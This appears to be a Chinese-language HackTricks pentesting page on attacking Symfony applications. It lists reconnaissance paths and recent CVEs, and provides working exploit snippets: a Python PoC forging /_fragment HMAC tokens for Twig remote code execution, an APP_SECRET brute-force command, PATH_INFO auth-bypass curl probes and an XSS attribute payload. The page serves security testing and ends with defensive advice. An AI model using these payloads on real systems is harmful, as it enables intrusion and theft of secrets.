# Symfony

{{#include ../../banners/hacktricks-training.md}}

Symfony 是最广泛使用的 PHP 框架之一，常出现在对企业、电商和 CMS 目标的评估中（Drupal、Shopware、Ibexa、OroCRM … 都嵌入了 Symfony 组件）。本页汇总了在发现 Symfony 应用时你应列入清单的进攻技巧、常见错误配置和近期漏洞。

> 历史说明：生态系统的大部分仍运行在 **5.4 LTS** 分支（EOL **2025年11月**）。Symfony **7.4** 在 **2025年11月** 成为新的 LTS，并将收到安全修复直到 **2029年11月**。始终核实精确的补丁级别，因为许多 2024‑2026 的通告仅在微版本中修复。

---

## 侦察与枚举

### 指纹识别
* HTTP 响应头: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` 或以 `sf_redirect`, `sf_session`, `MOCKSESSID` 开头的 cookies。
* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) 通常会揭示精确版本：
```bash
curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test("symfony/")) | .name,.version'
```
* 仅存在于 Symfony 的公共路由：
* `/_profiler`   (Symfony **Profiler** & debug toolbar)
* `/_wdt/<token>` (“Web Debug Toolbar”)
* `/_error/{code}.{_format}` (漂亮的错误页面)
* `/app_dev.php`, `/config.php`, `/config_dev.php` (pre-4.0 dev front-controllers)
* Wappalyzer、BuiltWith 或 ffuf/feroxbuster 的字典：`symfony.txt` → 寻找 `/_fragment`, `/_profiler`, `.env`, `.htaccess`。

### 重要文件与端点
| Path | Why it matters |
|------|----------------|
| `/.env`, `/.env.local`, `/.env.prod` | 常被错误部署 → leaks `APP_SECRET`, DB creds, SMTP, AWS keys |
| `/.git`, `.svn`, `.hg` | 源码泄露 → 凭证 + 业务逻辑 |
| `/var/log/*.log`, `/log/dev.log` | Web 根目录错误配置会暴露堆栈跟踪 |
| `/_profiler` | 完整请求历史、配置、服务容器、**APP_SECRET**（≤ 3.4） |
| `/_fragment` | 由 ESI/HInclude 使用的入口。一旦知道 `APP_SECRET` 即可滥用 |
| `/vendor/phpunit/phpunit/phpunit` | 若可访问则导致 PHPUnit RCE（CVE-2017-9841） |
| `/index.php/_error/{code}` | 指纹识别 & 有时会 leak 异常跟踪 |

---

## 高风险漏洞

### 1. APP_SECRET 泄露 ➜ 通过 `/_fragment` RCE（又名 “secret-fragment”）
* **CVE-2019-18889** 最初披露，但当调试保持启用或 `.env` 暴露时，在现代目标上仍然会出现。
* 一旦你知道 32 字符的 `APP_SECRET`，构造 HMAC 令牌并滥用内部 `render()` 控制器以执行任意 Twig：
```python
# PoC – requires the secret
import hmac, hashlib, requests, urllib.parse as u
secret = bytes.fromhex('deadbeef…')
payload = "{{['id']|filter('system')}}"   # RCE in Twig
query = {
'template': '@app/404.html.twig',
'filter': 'raw',
'_format': 'html',
'_locale': 'en',
'globals[cmd]': 'id'
}
qs = u.urlencode(query, doseq=True)
token = hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest()
r = requests.get(f"https://target/_fragment?{qs}&_token={token}")
print(r.text)
```
* 优秀的 write-up & exploitation script：Ambionics 博客（在 References 中有链接）。

### 2. PATH_INFO auth bypass – **CVE-2025-64500** (HttpFoundation)
* 影响低于 5.4.50、6.4.29 和 7.3.7 的版本。Path 规范化可能会去掉前导 `/`，从而破坏那些假定 `/admin` 等以 `/` 开头的访问控制规则。
* 快速测试：`curl -H 'PATH_INFO: admin/secret' https://target/index.php` → 如果在没有认证的情况下访问了 admin 路由，则命中该问题。
* 通过升级 `symfony/http-foundation` 或将整个框架升级到修复的补丁级别来修补。

### 3. MSYS2/Git-Bash argument mangling – **CVE-2026-24739** (Process)
* 影响在 Windows 上从 MSYS2（Git-Bash, mingw）运行 PHP 时的版本：< 5.4.51、6.4.33、7.3.11、7.4.5 和 8.0.5。`Process` 未能正确引用 `=`，导致路径损坏；破坏性命令（`rmdir`, `del`）可能会针对非预期目录。
* 如果你能上传 PHP 脚本或影响调用 `Process` 的 Composer/CLI helper，构造带有 `=` 的参数（例如 `E:/=tmp/delete`）可以导致路径重写。

### 4. Runtime env/argv injection – **CVE-2024-50340** (Runtime)
* 当 `register_argv_argc=On` 且使用非 SAPI 运行时，精心构造的查询字符串可能通过 `argv` 解析翻转 `APP_ENV`/`APP_DEBUG`。在 5.4.46/6.4.14/7.1.7 中修复。
* 在日志中查找 `/?--env=prod` 或类似被接受的条目。

### 5. URL validation / open redirect – **CVE-2024-50345** (HttpFoundation)
* URI 中的特殊字符未按浏览器方式进行相同验证，允许重定向到攻击者控制的域。已在 5.4.46/6.4.14/7.1.7 中修复。

### 6. Symfony UX attribute injection – **CVE-2025-47946**
* `symfony/ux-twig-component` & `symfony/ux-live-component` 在 **2.25.1** 之前会在未转义的情况下渲染 `{{ attributes }}` → 属性注入/XSS。如果应用允许用户定义组件属性（例如 admin CMS、email templating），可以链式利用到脚本注入。
* 将两个包更新到 2.25.1+。作为手工利用，将 JS 放在传给自定义组件的属性值中并触发渲染。

### 7. Windows Process Hijack – **CVE-2024-51736** (Process)
* `Process` 组件在 Windows 上会在 `PATH` 之前搜索当前工作目录。攻击者若能在可写的 web-root 上传 `tar.exe`, `cmd.exe` 等并触发 `Process`（例如文件解压、PDF 生成），即可获得命令执行。
* 在 5.4.50、6.4.14、7.1.7 中修复。

### 8. Session-Fixation – **CVE-2023-46733**
* Authentication guard 在登录后重用了已有的 session ID。如果攻击者在受害者认证前设置了 cookie，则在受害者登录后即可劫持账户。

### 9. Twig sandbox XSS – **CVE-2023-46734**
* 在暴露用户可控模板的应用（admin CMS、email builder）中，`nl2br` 过滤器可被滥用以绕过 sandbox 并注入 JS。

### 10. Symfony 1 gadget chains (still found in legacy apps)
* `phpggc symfony/1 system id` 会生成一个 Phar 负载，当对诸如 `sfNamespacedParameterHolder` 等类进行 unserialize() 时触发 RCE。检查文件上传端点和 `phar://` 包装器。


{{#ref}}
../../pentesting-web/deserialization/php-deserialization-+-autoload-classes.md
{{#endref}}

---

## 利用速查表

### 计算 `/_fragment` 的 HMAC 令牌
```bash
python - <<'PY'
import sys, hmac, hashlib, urllib.parse as u
secret = bytes.fromhex(sys.argv[1])
qs     = u.quote_plus(sys.argv[2], safe='=&')
print(hmac.new(secret, qs.encode(), hashlib.sha256).hexdigest())
PY deadbeef… "template=@App/evil&filter=raw&_format=html"
```
### Bruteforce 弱 `APP_SECRET`
```bash
cewl -d3 https://target -w words.txt
symfony-secret-bruteforce.py -w words.txt -c abcdef1234567890 https://target
```
### 通过暴露的 Symfony Console 实现 RCE
如果 `bin/console` 可通过 `php-fpm` 或直接通过 CLI 上传访问：
```bash
php bin/console about        # confirm it works
php bin/console cache:clear --no-warmup
```
在缓存目录内使用 deserialization gadgets，或编写一个恶意的 Twig template，将在下一次请求时被执行。

### 快速探测 PATH_INFO bypass (CVE-2025-64500)
```bash
curl -i -H 'PATH_INFO: admin/secret' https://target/index.php
# If it returns protected content without redirect/auth, the Request normalization is vulnerable.
```
### Spray UX attribute injection (CVE-2025-47946)
```twig
{# attacker-controlled attribute value #}
<live:button {{ attributes|merge({'onclick':'alert(1)'}) }} />
```
如果渲染的输出将属性以未转义形式回显，则 XSS 将成功。请升级补丁到 2.25.1+。

---

## 防御注意事项
1. **切勿在生产环境部署调试模式** (`APP_ENV=dev`, `APP_DEBUG=1`)；在 web-server 配置中屏蔽 `/app_dev.php`, `/_profiler`, `/_wdt`。
2. 将密钥存放在环境变量或 `vault/secrets.local.php` 中，*绝不*放在可被 document-root 访问的文件中。
3. 强制执行补丁管理 —— 订阅 Symfony 安全通告，并至少保持 LTS 补丁级别（5.4.x 至 2025 年 11 月，6.4 至 2027 年 11 月，7.4 至 2029 年 11 月）。
4. 如果在 Windows 上运行，请立即升级以缓解 CVE-2024-51736 与 CVE-2026-24739，或添加 `open_basedir`/`disable_functions` 等纵深防御措施。

---

### 有用的进攻工具
* **ambionics/symfony-exploits** – secret-fragment RCE、调试路由发现。
* **phpggc** – Ready-made gadget chains for Symfony 1 & 2.
* **sf-encoder** – 用于计算 `_fragment` HMAC 的小工具（Go 实现）。



## References
* [Ambionics – Symfony “secret-fragment” Remote Code Execution](https://www.ambionics.io/blog/symfony-secret-fragment)
* [Symfony Security Advisory – CVE-2024-51736: Command Execution Hijack on Windows Process Component](https://symfony.com/blog/cve-2024-51736-command-execution-hijack-on-windows-with-process-class)
* [Symfony Blog – CVE-2025-47946: Unsanitized HTML attribute injection in UX components](https://symfony.com/blog/symfony-ux-cve-2025-47946-unsanitized-html-attribute-injection-via-componentattributes)
* [Symfony Blog – CVE-2026-24739: Incorrect argument escaping under MSYS2/Git Bash](https://symfony.com/blog/cve-2026-24739-incorrect-argument-escaping-under-msys2-git-bash-on-windows-can-lead-to-destructive-file-operations)
{{#include ../../banners/hacktricks-training.md}}
